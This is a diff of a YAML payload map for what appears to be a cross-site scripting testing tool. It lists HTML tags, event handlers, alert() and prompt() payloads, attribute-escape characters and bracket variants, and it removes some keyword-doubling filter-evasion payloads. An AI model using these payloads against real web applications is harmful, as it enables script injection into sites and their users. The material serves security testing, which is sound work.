@@ -1,28 +1,74 @@
 ---
 # Payload map for HTML Context
 "svg":
-  "onlonloadoad":
-    payloads:
-      - "<svg/onlonloadoad=oad=alealertrt()>"
-  "onlonloadoad=oad":
-    payloads:
-      - "<svg/onlonloadoad=oad=alealertrt()>"
   "onload":
     payloads:
       - "<svg onload=alert()>"
       - "<svg/onload=alert()>"
 "img":
+  "onloadstart":
+    requires:
+      - "src"
+      - "srcset"
   "onload":
-    payloads:
-      - "<img onload=alert()>"
-      - "<img/onload=alert()>"
+    requires:
+      - "src"
+      - "srcset"
   "onerror":
-    payloads:
-      - "<img src=x onerror=alert()>"
+    requires:
+      - "src"
+"img2":
+  "onloadstart":
+    requires:
+      - "src"
+      - "srcset"
+  "onload":
+    requires:
+      - "src"
+      - "srcset"
+  "onerror":
+    requires:
+      - "src"
+"image":
+  "onloadstart":
+    requires:
+      - "src"
+      - "srcset"
+  "onload":
+    requires:
+      - "src"
+      - "srcset"
+  "onerror":
+    requires:
+      - "src"
+"image2":
+  "onloadstart":
+    requires:
+      - "src"
+      - "srcset"
+  "onload":
+    requires:
+      - "src"
+  "onerror":
+    requires:
+      - "src"
 "input":
   "autofocus":
     payloads:
       - "<input autofocus=\"\" onfocus=alert()>"
+"head":
+  "onfocus":
+    reqires:
+      - "tabindex"
+      - "style"
+"html":
+"body":
+  "onmessage":
+  "onpageshow":
+"frameset":
+  "onpageshow":
+  "onpaste":
+
 ...
 ---
 # Payloads for attribute context
@@ -37,15 +83,20 @@
   - "onmouseup"
   - "onmousedown"
   - "onload"
+  - "onfocus"
+  - "onerror"
   - "onpageshow"
   - "onscroll"
 "actions":
   - "alert()"
-  - "confirm()"
-  - "confirm``"
-  - "alealertrt()"
+  - "alert(x)"
+  - "alert(1)"
+  - "prompt()"
+  - "prompt``"
   - "alert``"
-  - "alealert``"
+  - "alert`x`"
+  - "javascript:alert()"
+  - "javascript:alert``"
 "escapeAttr":
   - "'"
   - "\'"
@@ -56,11 +107,9 @@
 "openBracket":
   - "<"
   - "\\<"
-  - "%3c"
 "closeBracket":
   - ">"
   - "\\>"
   - "/>"
   - "\\>"
-  - "%3e"
 ---
